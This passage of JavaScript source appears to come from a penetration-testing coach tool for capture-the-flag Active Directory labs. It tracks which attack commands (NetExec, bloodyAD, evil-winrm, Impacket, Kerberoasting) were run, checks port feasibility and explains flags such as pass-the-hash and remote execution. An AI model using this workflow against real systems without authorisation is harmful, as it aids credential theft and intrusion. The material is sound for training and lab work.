  // Has a command with these same action tokens already been run (is it in the activity ledger)? Used by
  // the coach to demote a suggested variant you have already executed, so it stops re-offering it.
  function commandWasRun(filledCmd, activities, params, target, curEpoch) {
    if (!filledCmd || !Array.isArray(activities) || !activities.length) return false;
    var curIsAdminTier = !!(curEpoch && /\badmin\b|\bsystem\b|\broot\b/i.test(String(curEpoch)));
    if (/\bwhoami\b/i.test(filledCmd) && /\b(?:ipconfig|ifconfig|ip\s+-4)\b/i.test(filledCmd) && /\b(?:type|cat|find)\b/i.test(filledCmd)) {
      var cfProof = _canonCmd(filledCmd);
      for (var pi = 0; pi < activities.length; pi++) {
        var pact = activities[pi] || {};
        if (target && !_actMatchesTarget(pact, target)) continue;
        if (curIsAdminTier && pact.epoch && !/\badmin\b|\bsystem\b|\broot\b/i.test(String(pact.epoch))) continue;
        if (pact.command && _canonCmd(pact.command) === cfProof) return true;
      }
      return false;
    }
    var sig = _actionSig(filledCmd, params), keys = Object.keys(sig);
    // Only DISTINCTIVE commands are confidently "already run": a verb+object enumeration or grant has 3+
    // action tokens (`bloodyad get writable`, `nxc ldap --users`, `bloodyad add dcsync`). A generic
    // tool+mode invocation, `nxc smb` (validate), `evil-winrm`, `impacket-psexec`, `certipy find`, is a
    // re-runnable check/shell that recurs across many moves; marking it run is high-confusion, low-value,
    // and is exactly what wrongly flagged an UNRUN `nxc smb` as ran. Bias to under-marking: re-suggesting
    // a command is a mild annoyance, wrongly hiding one you still need is the failure that keeps biting.
    if (keys.length < 3) return false;
    var sigs = _activitySigs(activities, params, target);
    for (var i = 0; i < sigs.length; i++) {
      var asig = sigs[i], match = true;
      for (var k = 0; k < keys.length; k++) {
        if (!asig[keys[k]]) { match = false; break; }
      }
      if (match) return true;
    }
    return false;
  }

  function commandRanExactOrSig(filledCmd, activities, params, target) {
    if (!filledCmd || !Array.isArray(activities) || !activities.length) return false;
    var cf = _canonCmd(filledCmd);
    if (cf) {
      for (var i = 0; i < activities.length; i++) {
        var act = activities[i] || {};
        if (target && !_actMatchesTarget(act, target)) continue;
        if (act.command && _canonCmd(act.command) === cf) return true;
        if (Array.isArray(act.sequenceCommands)) {
          for (var j = 0; j < act.sequenceCommands.length; j++) {
            if (_canonCmd(act.sequenceCommands[j]) === cf) return true;
          }
        }
      }
    }
    return commandWasRun(filledCmd, activities, params, target);
  }

  // Which {{tokens}} in a template are still unfilled (dependencies the operator must supply).
  function unfilledTokens(filledText) {
    var out = [], re = /\{\{([a-zA-Z0-9_]+)\}\}/g, m;
    while ((m = re.exec(filledText)) !== null) { if (out.indexOf(m[1]) === -1) out.push(m[1]); }
    return out;
  }

  var EARNED_TOKENS = {
    domain: 1, basedn: 1, dc: 1, dc_netbios: 1, dc_account: 1, user: 1, password: 1,
    nthash: 1, userlist: 1, hashfile: 1, domain_sid: 1, forest_root_sid: 1, extra_sid: 1, target_sam: 1, group: 1, abuse_groups_quoted: 1, ca_name: 1, template: 1,
    pfx: 1, nmap_ports: 1, krbtgt_hash: 1, dahash: 1, dauser: 1, flag_path_local: 1, flag_smb_path_local: 1, flag_path_root: 1, share: 1, cpassword: 1,
    edb_id: 1, edb_file: 1, edb_path: 1, custom_bin: 1, source_path: 1, app_base_path: 1, ssh_key_path: 1, reuse_user: 1, reuse_secret: 1
  };

  function _normCmd(s) {
    return String(s || '').trim().replace(/\s+/g, ' ');
  }

  function primaryBinary(cmdStr) {
    var m = String(cmdStr || '').trim().match(/^(?:sudo\s+)?(\S+)/);
    return m ? m[1].replace(/^.*[\\/]/, '') : '';
  }

  function _canonCmd(s) {
    return _normCmd(s)
      .replace(/^\S+/, function (t) { return t.toLowerCase(); })
      .replace(/\s*\|\s*tee\s+\S+\s*$/i, '')
      .replace(/'([A-Za-z0-9_@%+=:,./-]+)'/g, '$1')
      .replace(/"([A-Za-z0-9_@%+=:,./-]+)"/g, '$1')
      .replace(/\s+--detail\b/g, '');
  }

  function _privEpoch(e, ignoreCredList) {
    if (!e) return '';
    var s = String(e).replace(/(?:^|\|)h:[^|]*/g, '');
    if (ignoreCredList) s = s.replace(/(?:^|\|)cred:[^|]*/g, '');
    return s.replace(/^\|+|\|+$/g, '') || 'anon';
  }

  function commandTriedInEpoch(action, cmdObj, filledStr, activities, epoch, target, resolvedContext) {
    if (!action || !cmdObj || !Array.isArray(activities) || !activities.length) return false;
    var rawRun = _normCmd(cmdObj.run);
    var filledCmd = _normCmd(filledStr);
    var canonFilled = _canonCmd(filledCmd || rawRun);
    var privEp = _privEpoch(epoch);
    var isDistinctive = Object.keys(_actionSig(rawRun, {})).length >= 3;
    var cmdTool = String(cmdObj.tool || primaryBinary(rawRun) || '').toLowerCase().replace(/\.(py|exe)$/, '');
    var sameToolCount = 0;
    var cmds = action.commands || [];
    if (cmdTool) {
      for (var c = 0; c < cmds.length; c++) {
        var ct = String(cmds[c].tool || primaryBinary(cmds[c].run) || '').toLowerCase().replace(/\.(py|exe)$/, '');
        if (ct === cmdTool) sameToolCount++;
      }
    }
    var isFlagHuntSession = (action.id === 'flag-hunt-windows' || action.id === 'flag-hunt-root-windows') && cmdTool === 'evil-winrm';
    var currentContext = resolvedContext;
    if (!currentContext && action.resolvedContext && action.resolvedContext.target === target) currentContext = action.resolvedContext.facts.forAction(action, cmdObj)._resolvedContext;
    if (!currentContext && OBOL.context && OBOL.store && OBOL.store.active) currentContext = OBOL.context.resolve({engagement:OBOL.store.active(),target:target,command:filledStr || rawRun,actionId:action.id,locus:OBOL.pack && OBOL.pack.commandExecutionLocus ? OBOL.pack.commandExecutionLocus(cmdObj) : 'remote'});
    var isOnHostFlagSweepCmd = !!(action && (action.id === 'flag-hunt-windows' || action.id === 'flag-hunt-linux')
      && ((OBOL && OBOL.pack && OBOL.pack.commandExecutionLocus && OBOL.pack.commandExecutionLocus(cmdObj) === 'onhost') || cmdTool === 'evil-winrm' || cmdTool === 'ssh')
      && (cmdTool === 'evil-winrm' || cmdTool === 'ssh' || (/(?:local|user|proof|root)\.txt|\*local\*|\*user\*|\*proof\*|\*root\*|flag_names_|flag_inames_/i.test(rawRun) && !/\{\{flag_path_/.test(rawRun))));
    var isSpnRoastCmd = !!(action && action.id === 'kerberoast'
      && /--kerberoasting\b|GetUserSPNs|Rubeus.*kerberoast/i.test(rawRun)
      && !/-no-preauth\b/i.test(rawRun));
    for (var a = 0; a < activities.length; a++) {
      var act = activities[a];
      if (!act) continue;
      var sameAction = (act.action_id || act.actionId) === action.id;
      if (!sameAction && !isDistinctive && !isOnHostFlagSweepCmd && !isSpnRoastCmd) continue;
      var actTarget = act.target || (/^host:/.test(act.scope || '') ? act.scope.slice(5) : '');
      if (target && actTarget !== target) continue;
      if (isSpnRoastCmd) {
        var spnCmdRaw = String(act.command || act.dispatch || '');
        var spnOutRaw = String(act.output || act.stdout || '');
        var spnProdTgs = Array.isArray(act.produced) && act.produced.indexOf('hash.tgs') >= 0;
        if (/--kerberoasting\b|GetUserSPNs|Rubeus.*kerberoast/i.test(spnCmdRaw)
            && !spnProdTgs
            && /Total of records returned\s+0\b|No entries found|No SPNs found/i.test(spnOutRaw)) {
          return true;
        }
      }
      if (isOnHostFlagSweepCmd) {
        var actCmdRaw = String(act.command || act.dispatch || '');
        var actOutRaw = String(act.output || act.stdout || '');
        var hasInSessionSweepInOut = /\*user\*\.txt|\*local\*\.txt|for\s+%n\s+in\s+\(local\.txt\s+user\.txt\)|\[!\]\s*No readable local\.txt|Get-ChildItem\s+-Path\s+C:\\Users[^\r\n]*(?:local|user)\.txt|dir\s+\/b\s+\/s\s+\/a-d\s+C:\\Users|find\s+\/\s+-xdev[^\r\n]*(?:user|local)\.txt/i.test(actOutRaw);
        var actWasFlagSweep = hasInSessionSweepInOut || (/(?:local|user)\*?\.txt|\*(?:local|user)\*/i.test(actCmdRaw)
          && /(?:get-childitem|\bgci\b|dir\s+\/b|find\s+\/)/i.test(actCmdRaw)
          && !/\b(?:nxc|netexec|crackmapexec|cme|smbclient|smbmap|evil-winrm|xfreerdp|impacket-|ssh|sshpass)\b/i.test(actCmdRaw));
        var actProducedFlag = Array.isArray(act.produced) && act.produced.some(function (k) { return /^(?:objective\.(?:local_flag|flag_located_local|flag$))/.test(String(k || '')); });
        var actWasSyntaxErr = (!hasInSessionSweepInOut && !!(act.outcome && act.outcome.kind === 'environment-error'))
          || (!hasInSessionSweepInOut && /\bParserError\b|is not recognized as the name of a cmdlet/i.test(actOutRaw));
        if (actWasFlagSweep && !actProducedFlag && !actWasSyntaxErr) {
          var isAdminEpoch = /\badmin\b|\bsystem\b|\broot\b/i.test(privEp);
          var actWasAdminEpoch = /\badmin\b|\bsystem\b|\broot\b/i.test(String(act.epoch || ''));
          if (!isAdminEpoch || actWasAdminEpoch) return true;
        }
      }
      var previousContext = act.context || (act.outcome && act.outcome.context);
      var hasCtxMatch = !!(currentContext && previousContext);
      if (privEp && act.epoch && _privEpoch(act.epoch, hasCtxMatch) !== _privEpoch(epoch, hasCtxMatch)) continue;
      if (act.outcome && !act.outcome.retireCommand) {
        if (OBOL && OBOL.outcomes && OBOL.outcomes.completion) {
          var comp = OBOL.outcomes.completion(act.output || act.stdout || '', act.command || act.dispatch || '');
          if (comp && comp.complete && ((act.outcome.kind === 'success' && /(?:^|\s)--host\b/i.test(act.command || '')) || comp.negative)) {
            act.outcome.conclusive = true;
            act.outcome.retireCommand = true;
          }
        }
        if (!act.outcome.retireCommand) continue;
      }
      if (currentContext) {
        if (!previousContext) continue;
        if ((previousContext.credentialId || null) !== currentContext.credentialId || (previousContext.service || '') !== currentContext.service || (previousContext.locus || 'remote') !== currentContext.locus) continue;
      }
      var ac = _normCmd(act.command);
      var ad = _normCmd(act.dispatch);
      var wantLocalAuth = /(?:^|\s)--local-auth\b/i.test(filledCmd || rawRun);
      var gotLocalAuth = /(?:^|\s)--local-auth\b/i.test(ac || ad);
      if (wantLocalAuth !== gotLocalAuth) continue;
      if (ac && (ac === rawRun || (filledCmd && ac === filledCmd) || (canonFilled && _canonCmd(ac) === canonFilled))) return true;
      if (Array.isArray(act.sequenceCommands)) {
        for (var scIdx = 0; scIdx < act.sequenceCommands.length; scIdx++) {
          var scNorm = _normCmd(act.sequenceCommands[scIdx]);
          if (/(?:^|\s)--local-auth\b/i.test(scNorm) !== wantLocalAuth) continue;
          if (scNorm && (scNorm === rawRun || (filledCmd && scNorm === filledCmd) || (canonFilled && _canonCmd(scNorm) === canonFilled))) return true;
        }
      }
      if (filledCmd && ad && ad.indexOf(filledCmd) >= 0) return true;
      if (sameAction) {
        var actTool = String(act.tool || primaryBinary(ac) || '').toLowerCase().replace(/\.(py|exe)$/, '');
        var acOrigin = ((ac || ad).match(/https?:\/\/[^\s/'"]+/i) || [''])[0].toLowerCase();
        var fillOrigin = (filledCmd.match(/https?:\/\/[^\s/'"]+/i) || [''])[0].toLowerCase();
        var originMismatch = !!(acOrigin && fillOrigin && acOrigin !== fillOrigin);
        if (!originMismatch && !currentContext && cmdTool && actTool === cmdTool && (!ac || sameToolCount === 1 || isFlagHuntSession)) return true;
      }
    }
    return false;
  }

  function moveDryTriesInEpoch(action, facts, eng, epoch, target) {
    if (!action || !eng || !Array.isArray(eng.activities) || !eng.activities.length) return 0;
    var acts = eng.activities;
    var curEpoch = epoch || ((root.OBOL && root.OBOL.pack && root.OBOL.pack.accessEpoch && facts) ? root.OBOL.pack.accessEpoch(facts) : '');
    var privEp = _privEpoch(curEpoch);
    var tgt = target || action.contextTarget || (eng.params && eng.params.target) || '';
    // `eng.activities` is stored newest-first (`unshift`), so index 0 is the most recent paste.
    // Find the most recent productive (addedCount > 0) or active-blocker paste on this action;
    // only dry attempts MORE RECENT than that (`0 <= m < firstProductiveIdx`) count as current dry tries.
    var isFlagHunt = !!(root.OBOL && root.OBOL.pack && root.OBOL.pack.isFlagHuntAction && root.OBOL.pack.isFlagHuntAction(action));
    var FLAG_SEARCH_CMD_RE = /local\.txt|user\.txt|proof\.txt|root\.txt|\*local\*|\*user\*|\*proof\*|\*root\*|--spider|get-childitem|\bgci\b|dir\s+\/b|find\s+\//i;
    var actionProduces = (action && Array.isArray(action.produces)) ? action.produces : [];
    function _actAddedFacts(a) {
      var aCmd = String((a && (a.command || a.dispatch)) || '');
      var aOut = String((a && (a.output || a.stdout)) || '');
      var aCmdAndOut = aCmd + '\n' + aOut;
      if (isFlagHunt && FLAG_SEARCH_CMD_RE.test(aCmdAndOut)) {
        return Array.isArray(a.produced) && a.produced.some(function (p) { return /^objective\./.test(String(p || '')); });
      }
      if (OBOL && OBOL.outcomes && OBOL.outcomes.completion) {
        var aComp = OBOL.outcomes.completion(aOut, aCmd);
        if (aComp && aComp.complete && aComp.negative) {
          return Array.isArray(a.produced) && a.produced.some(function (p) { return actionProduces.indexOf(p) >= 0; });
        }
      }
      if (action && action.id === 'ad-path-manual' && /\bbloodyad\b.*\bget\s+writable\b/i.test(aCmd)) {
        return Array.isArray(a.produced) && a.produced.some(function (p) {
          return p === 'ad.acl_lead' || p === 'ad.control_paths' || p === 'ad.attack_paths';
        });
      }
      if (typeof a.addedCount === 'number') return a.addedCount > 0;
      return Array.isArray(a.produced) && a.produced.some(function (p) { return p && !/^blocker\./.test(p); });
    }
    var firstProductiveIdx = acts.length;
    var curIsAdminTier = /\badmin\b|\bsystem\b|\broot\b/i.test(privEp);
    for (var k = 0; k < acts.length; k++) {
      var ak = acts[k];
      if (!ak || (ak.action_id || ak.actionId) !== action.id) continue;
      var akTgt = ak.target || (/^host:/.test(ak.scope || '') ? ak.scope.slice(5) : '');
      if (tgt && akTgt && akTgt !== tgt) continue;
      if (isFlagHunt) {
        var akIsAdminTier = /\badmin\b|\bsystem\b|\broot\b/i.test(String(ak.epoch || ''));
        if (curIsAdminTier && !akIsAdminTier) continue;
      } else if (privEp && ak.epoch && _privEpoch(ak.epoch) !== privEp) {
        continue;
      }
      var hasActiveBlocker = Array.isArray(ak.blockers) && ak.blockers.length && facts && typeof facts.has === 'function' &&
        ak.blockers.some(function (b) { return facts.has(b); });
      if (hasActiveBlocker || _actAddedFacts(ak)) {
        firstProductiveIdx = k;
        break;
      }
    }
    var dryActs = [];
    for (var m = 0; m < firstProductiveIdx; m++) {
      var am = acts[m];
      if (!am) continue;
      var amTgt = am.target || (/^host:/.test(am.scope || '') ? am.scope.slice(5) : '');
      if (tgt && amTgt && amTgt !== tgt) continue;
      var amBlocker = Array.isArray(am.blockers) && am.blockers.length && facts && typeof facts.has === 'function' &&
        am.blockers.some(function (b) { return facts.has(b); });
      if (amBlocker || _actAddedFacts(am)) continue;
      if (!isFlagHunt && am.outcome && !am.outcome.retireCommand) {
        if (OBOL && OBOL.outcomes && OBOL.outcomes.completion) {
          var amComp = OBOL.outcomes.completion(am.output || am.stdout || '', am.command || am.dispatch || '');
          if (amComp && amComp.complete && ((am.outcome.kind === 'success' && /(?:^|\s)--host\b/i.test(am.command || '')) || amComp.negative)) {
            am.outcome.conclusive = true;
            am.outcome.retireCommand = true;
          }
        }
        if (!am.outcome.retireCommand) continue;
      }
      dryActs.push(am);
    }
    if (!dryActs.length) return 0;
    var cmds = action.commands || [];
    if (!cmds.length) return 0;
    var commandParams = action.resolvedContext ? action.resolvedContext.params : Object.assign({}, eng.params || {}, tgt ? { target: tgt } : {});
    var wsTokens = (root.OBOL && root.OBOL.workspace && root.OBOL.workspace.tokens) ? root.OBOL.workspace.tokens(eng) : {};
    var filled = fillAll(action, facts, { params: commandParams, profile: eng.profile, workspace: wsTokens });
    var dryCount = 0;
    for (var i = 0; i < cmds.length; i++) {
      var cmd = cmds[i];
      var commandFacts = facts && facts.forAction ? facts.forAction(action, cmd) : facts;
      if (root.OBOL && root.OBOL.pack && root.OBOL.pack.commandSettled && root.OBOL.pack.commandSettled(cmd, commandFacts)) {
        continue;
      }
      var ctx = (commandFacts && commandFacts._resolvedContext) || action.resolvedContext || (facts && facts._resolvedContext);
      if (commandTriedInEpoch(action, cmd, filled[i] && filled[i].filled, dryActs, curEpoch, tgt, ctx)) {
        dryCount++;
      }
    }
    if (dryCount > dryActs.length) dryCount = dryActs.length;
    var directActionDry = dryActs.filter(function (da) {
      if ((da.action_id || da.actionId) !== action.id) return false;
      if (!isFlagHunt && (!da.outcome || !da.outcome.retireCommand)) return false;
      var daTgt = da.target || (/^host:/.test(da.scope || '') ? da.scope.slice(5) : '');
      if (tgt && daTgt && daTgt !== tgt) return false;
      if (isFlagHunt) {
        var daIsAdminTier = /\badmin\b|\bsystem\b|\broot\b/i.test(String(da.epoch || ''));
        if (curIsAdminTier && !daIsAdminTier) return false;
      } else if (privEp && da.epoch && _privEpoch(da.epoch) !== privEp) {
        return false;
      }
      return true;
    }).length;
    return Math.max(dryCount, directActionDry);
  }

  function bestCommandIndex(action, facts, opts) {
    if (!action) return 0;
    var commands = action.commands || [];
    if (!commands.length) return 0;
    opts = opts || {};
    var locus = opts.locus || ((root.OBOL && root.OBOL.pack && root.OBOL.pack.defaultCommandLocus) ? root.OBOL.pack.defaultCommandLocus(action, facts) : (action.locus === 'F' || action.locus === 'I' ? 'onhost' : 'remote'));
    var filled = fillAll(action, facts, opts);
    function isGated(cmd, i) {
      var commandFacts = facts && facts.forAction ? facts.forAction(action, cmd) : facts;
      if (action.eligible && commandFacts && !action.eligible(commandFacts)) return true;
      if (OBOL.pack && OBOL.pack.commandIsEligible && !OBOL.pack.commandIsEligible(cmd, commandFacts, action)) return true;
      if (!filled[i]) return false;
      if (filled[i].blocked) return true;
      var un = unfilledTokens(filled[i].filled || '');
      return un.some(function (t) { return EARNED_TOKENS[t]; });
    }
    var activeEng = (!Array.isArray(opts.activities) && root.OBOL && root.OBOL.store && typeof root.OBOL.store.active === 'function') ? root.OBOL.store.active() : null;
    var acts = (Array.isArray(opts.activities) && opts.activities.length) ? opts.activities : (activeEng && Array.isArray(activeEng.activities) && activeEng.activities.length ? activeEng.activities : null);
    var curEpoch = opts.epoch || ((root.OBOL && root.OBOL.pack && root.OBOL.pack.accessEpoch && facts) ? root.OBOL.pack.accessEpoch(facts) : '');
    var triedFn = acts ? function (cmd, i) {
      var commandFacts = (facts && facts.forAction) ? facts.forAction(action, cmd) : facts;
      var ctx = (commandFacts && commandFacts._resolvedContext) || action.resolvedContext || (facts && facts._resolvedContext) || null;
      var tgt = (opts.params && opts.params.target) || action.contextTarget || (ctx && ctx.target) || ((root.OBOL && root.OBOL.store && typeof root.OBOL.store.activeTarget === 'function') ? root.OBOL.store.activeTarget() : '');
      return commandTriedInEpoch(action, cmd, filled[i] && filled[i].filled, acts, curEpoch, tgt, ctx);
    } : null;
    if (root.OBOL && root.OBOL.pack && root.OBOL.pack.preferredCommandIndex) {
      return root.OBOL.pack.preferredCommandIndex(action, locus, facts || null, isGated, triedFn);
    }
    for (var i = 0; i < commands.length; i++) {
      var cmd = commands[i];
      if (root.OBOL && root.OBOL.pack && root.OBOL.pack.commandSettled) {
        if (root.OBOL.pack.commandSettled(cmd, facts)) continue;
      } else if (cmd && (cmd.settled_by || cmd.settledBy) && facts) {
        var sb = cmd.settled_by || cmd.settledBy;
        var settled = false;
        for (var s = 0; s < sb.length; s++) { if (facts.has(sb[s])) { settled = true; break; } }
        if (settled) continue;
      }
      if (!isGated(cmd, i)) return i;
    }
    return 0;
  }

  // Check if a command's transport port is confirmed open when port evidence exists
  var CMD_PORT_MAP = {
    'evil-winrm': [5985, 5986],
    'winrs': [5985, 5986],
    'ssh': [22, 2222], 'sshpass': [22, 2222],
    'smbclient': [445, 139], 'smbmap': [445, 139],
    'impacket-psexec': [445], 'impacket-wmiexec': [445, 135], 'impacket-smbexec': [445],
    'psexec': [445], 'wmiexec': [445, 135], 'smbexec': [445],
    'xfreerdp': [3389], 'xfreerdp3': [3389], 'rdesktop': [3389],
    'mysql': [3306], 'mssqlclient': [1433], 'impacket-mssqlclient': [1433],
    'ldapsearch': [389, 636, 3268, 3269], 'windapsearch': [389, 636, 3268, 3269],
    'ftp': [21], 'snmpwalk': [161], 'onesixtyone': [161]
  };
  var NXC_PROTO_PORTS = {
    'smb': [445, 139],
    'winrm': [5985, 5986],
    'ldap': [389, 636, 3268, 3269],
    'ldaps': [636, 3269, 389, 3268],
    'ssh': [22, 2222],
    'rdp': [3389],
    'mssql': [1433],
    'ftp': [21],
    'vnc': [5900, 5901],
    'wmi': [135, 445]
  };

  var PROTO_REACHABLE_BY_PORT = {
    21: { kinds: ['ftp.reachable', 'service.ftp', 'ftp.anonymous_login', 'ftp.authenticated'], svcRe: /^ftp/i },
    22: { kinds: ['ssh.reachable', 'service.ssh', 'ssh.authenticated'], svcRe: /^ssh/i },
    80: { kinds: ['http.reachable', 'https.reachable', 'service.http', 'service.https', 'service.http-proxy', 'service.http-alt', 'http.authenticated'], svcRe: /^(?:https?|http-(?:proxy|alt))$/i },
    443: { kinds: ['https.reachable', 'http.reachable', 'service.https', 'service.ssl/http', 'http.authenticated'], svcRe: /^(?:https|ssl\/http)$/i },
    161: { kinds: ['snmp.reachable', 'service.snmp'], svcRe: /^snmp/i },
    389: { kinds: ['ldap.reachable', 'service.ldap', 'ldap.authenticated'], svcRe: /^ldap/i },
    636: { kinds: ['ldap.reachable', 'service.ldaps', 'ldap.authenticated'], svcRe: /^ldaps/i },
    445: { kinds: ['smb.reachable', 'service.smb', 'service.microsoft-ds', 'service.netbios-ssn', 'smb.authenticated'], svcRe: /^(?:smb|microsoft-ds|netbios-ssn)/i },
    1433: { kinds: ['mssql.reachable', 'service.mssql', 'service.ms-sql-s', 'mssql.authenticated', 'mssql.sysadmin'], svcRe: /^(?:ms-sql|mssql)/i },
    3306: { kinds: ['mysql.reachable', 'service.mysql', 'mysql.authenticated', 'db.session', 'db.creds', 'db.reachable'], svcRe: /^mysql/i },
    3389: { kinds: ['rdp.reachable', 'service.rdp', 'service.ms-wbt-server', 'host.rdp_enabled', 'rdp.authenticated'], svcRe: /^(?:rdp|ms-wbt-server)/i },
    5900: { kinds: ['vnc.reachable', 'service.vnc', 'service.rfb'], svcRe: /^(?:vnc|rfb)/i },
    5985: { kinds: ['winrm.reachable', 'service.winrm', 'service.wsman', 'host.winrm_enabled', 'winrm.authenticated'], svcRe: /^(?:winrm|wsman)$/i },
    5986: { kinds: ['winrm.reachable', 'service.winrm', 'service.wsman', 'host.winrm_enabled', 'winrm.authenticated'], svcRe: /^(?:winrm|wsman)$/i }
  };

  function resolveSemanticProtocolPort(facts, portsNeeded) {
    if (!facts || !portsNeeded || !portsNeeded.length) return null;
    var hasFn = typeof facts.has === 'function';
    var valsFn = typeof facts.values === 'function';
    var factArr = Array.isArray(facts.facts) ? facts.facts : (Array.isArray(facts) ? facts : []);
    for (var pi = 0; pi < portsNeeded.length; pi++) {
      var defPort = portsNeeded[pi];
      var spec = PROTO_REACHABLE_BY_PORT[defPort];
      if (!spec) continue;
      for (var ki = 0; ki < spec.kinds.length; ki++) {
        var fk = spec.kinds[ki];
        var present = hasFn ? facts.has(fk) : factArr.some(function (f) { return f && f.kind === fk && (!f.state || f.state === 'supported'); });
        if (!present) continue;
        if (valsFn) {
          var kVals = facts.values(fk) || [];
          for (var vi = 0; vi < kVals.length; vi++) {
            var pNum = kVals[vi] && typeof kVals[vi] === 'object' ? Number(kVals[vi].port) : NaN;
            if (pNum > 0 && pNum <= 65535) return pNum;
          }
        }
        if (spec.svcRe && factArr.length) {
          for (var fi = 0; fi < factArr.length; fi++) {
            var pf = factArr[fi];
            if (!pf || (pf.state && pf.state !== 'supported')) continue;
            var pm = /^port:(\d+)$/.exec(pf.kind || '');
            if (pm && pf.value && spec.svcRe.test(String(pf.value.service || ''))) return Number(pm[1]);
          }
        }
        return defPort;
      }
    }
    return null;
  }

  function commandPortFeasible(cmd, facts) {
    if (!cmd || !facts) return { feasible: true };
    var isObj = typeof cmd === 'object';
    var runStr = isObj ? String(cmd.run || '') : String(cmd || '');
    if (isObj && cmd.locus === 'onhost' && !cmd.requires_port && !/\{\{target\}\}/.test(runStr)) {
      return { feasible: true };
    }
    var tool = String((isObj && cmd.tool) || primaryBinary(runStr) || '').toLowerCase().replace(/\.(?:py|exe)$/, '');
    var portsNeeded = null;
    if (/^(?:nxc|netexec|crackmapexec|cme)$/.test(tool) || /\b(?:nxc|netexec|crackmapexec|cme)\s+(?:smb|winrm|ldap|ldaps|ssh|rdp|mssql|ftp|vnc|wmi)\b/i.test(runStr)) {
      var pm = runStr.match(/\b(?:nxc|netexec|crackmapexec|cme)\s+(smb|winrm|ldap|ldaps|ssh|rdp|mssql|ftp|vnc|wmi)\b/i);
      if (pm) portsNeeded = NXC_PROTO_PORTS[pm[1].toLowerCase()];
    }
    if (!portsNeeded) portsNeeded = CMD_PORT_MAP[tool];
    if (!portsNeeded || !portsNeeded.length) return { feasible: true };

    var portsKnown = openPorts(facts);
    if (portsKnown && portsKnown.length) {
      for (var i = 0; i < portsNeeded.length; i++) {
        if (portsKnown.indexOf(portsNeeded[i]) >= 0 || (facts.has && facts.has('port:' + portsNeeded[i]))) {
          return { feasible: true, port: portsNeeded[i] };
        }
      }
    }
    var semPort = resolveSemanticProtocolPort(facts, portsNeeded);
    if (semPort !== null) {
      return { feasible: true, port: semPort };
    }
    var hasPortScan = !!(facts && typeof facts.has === 'function' && (facts.has('ports.open') || facts.has('scan.nmap.quick') || facts.has('scan.nmap.version') || facts.has('scan.nmap.full')));
    if (!portsKnown || !portsKnown.length || !hasPortScan) return { feasible: true }; // No scan data yet, don't rule out
    return { feasible: false, required: portsNeeded };
  }

  // Deconstruct common CLI flags into structured, plain-language explanations for student learning
  var FLAG_EXPLANATIONS = {
    '-m': 'Hash type mode (e.g. 18200 = Kerberos AS-REP, 13100 = Kerberos TGS, 1000 = NTLM, 0 = MD5)',
    '-u': 'Target username, username list, or URL',
    '-p': 'Password, hash, or password list',
    '-d': 'Target Active Directory domain name',
    '-H': 'NTLM hash for Pass-the-Hash authentication (no plaintext needed)',
    '-k': 'Use Kerberos ticket authentication (requires existing ccache / TGT)',
    '-dc-ip': 'IP address of Domain Controller for Kerberos/LDAP queries',
    '-request': 'Request Kerberos TGS service tickets for Kerberoasting',
    '-no-pass': 'Authenticate without a password (for AS-REP roasting or anonymous bind)',
    '-O': 'Optimized OpenCL hashcat kernel (faster speed; limits password length to 32)',
    '-Pn': 'Skip ICMP ping discovery (treat host as online, bypassing firewall blocks)',
    '-sC': 'Run default Nmap script set against discovered ports',
    '-sV': 'Probe open ports to fingerprint service and software version',
    '-oN': 'Save output in human-readable normal format to file',
    '-oX': 'Save output in structured XML format for parsers',
    '--min-rate': 'Send packets at minimum rate (packets/sec) for faster scanning',
    '--shares': 'List accessible SMB shares and current access rights',
    '--users': 'Query and enumerate domain user accounts',
    '--rid-brute': 'Enumerate domain users via anonymous/guest RPC RID cycling',
    '--asreproast': 'Extract AS-REP hashes for accounts with DONT_REQ_PREAUTH',
    '--kerberoasting': 'Request and extract TGS hashes for service accounts (SPNs)',
    '--bloodhound': 'Collect full Active Directory domain graph data for BloodHound',
    '-M': 'Execute a NetExec enumeration or post-exploitation module',
    '-x': 'Execute a remote shell command',
    '-X': 'Execute a remote PowerShell command',
    '--local-auth': 'Authenticate against local target SAM database instead of domain',
    '-r': 'Recursively list directories or shares',
    '-R': 'Recursively list directories or shares (smbmap)',
    '-w': 'Wordlist path for dictionary attack or directory fuzzing',
    '-t': 'Number of concurrent execution threads',
    '-N': 'No password / anonymous bind (suppress password prompt)',
    '-c': 'Execute a single command string and exit',
    '-L': 'List available SMB shares on the target',
    '-U': 'Username or credentials (format: DOMAIN\\USER%PASSWORD)',
    '--download': 'Download specified remote file from SMB share'
  };

  function explainFlags(cmdStr) {
    if (!cmdStr) return [];
    var toks = String(cmdStr).trim().split(/\s+/);
    var results = [];
    var seen = {};

    for (var i = 0; i < toks.length; i++) {
      var tok = toks[i];
      if (tok.charAt(0) !== '-') continue;
      var flagName = tok;
      var val = '';
      if (i + 1 < toks.length && toks[i + 1].charAt(0) !== '-') {
        val = toks[i + 1].replace(/^["']|["']$/g, '');
      }

      var exp = FLAG_EXPLANATIONS[flagName];
      if (!exp && flagName.indexOf('=') > 0) {
        var base = flagName.split('=')[0];
        exp = FLAG_EXPLANATIONS[base];
        val = flagName.slice(base.length + 1);
        flagName = base;
      }

      // Context-aware flag definitions
      if (flagName === '-p') {
        var firstTool = toks[0].toLowerCase();
        if (firstTool.indexOf('nmap') >= 0 || firstTool.indexOf('rustscan') >= 0 || /^[\d,-]+$/.test(val)) {
          exp = 'Target port(s) to probe (e.g. -p 80,445 or -p-)';
        }
      }

      var displayVal = val;
      if (val && val.length > 20) {
        if (val.indexOf(',') >= 0) {
          var pList = val.split(',');
          displayVal = pList.slice(0, 3).join(',') + '… (' + pList.length + ' ports)';
        } else {
          displayVal = val.slice(0, 18) + '…';
        }
      }

      if (exp && !seen[flagName]) {
        seen[flagName] = 1;
        results.push({
          flag: flagName,
          value: displayVal,
          fullValue: val,
          meaning: exp
        });
      }
    }
    return results;
  }

  OBOL.command = {
    shellQuote: shellQuote,
    openPorts: openPorts,
    webOrigins: webOrigins,
    scopedValues: scopedValues,
    buildContext: buildContext,
    commandContext: buildContext,
    fillTemplate: fillTemplate,
    fillCommand: fillCommand,
    fillAll: fillAll,
    applyArsenal: applyArsenal,
    commandWasRun: commandWasRun,
    commandRanExactOrSig: commandRanExactOrSig,
    unfilledTokens: unfilledTokens,
    commandPortFeasible: commandPortFeasible,
    explainFlags: explainFlags,
    bestCommandIndex: bestCommandIndex,
    commandTriedInEpoch: commandTriedInEpoch,
    moveDryTriesInEpoch: moveDryTriesInEpoch,
    EARNED_TOKENS: EARNED_TOKENS,
  };
})(typeof globalThis !== 'undefined' ? globalThis : this);

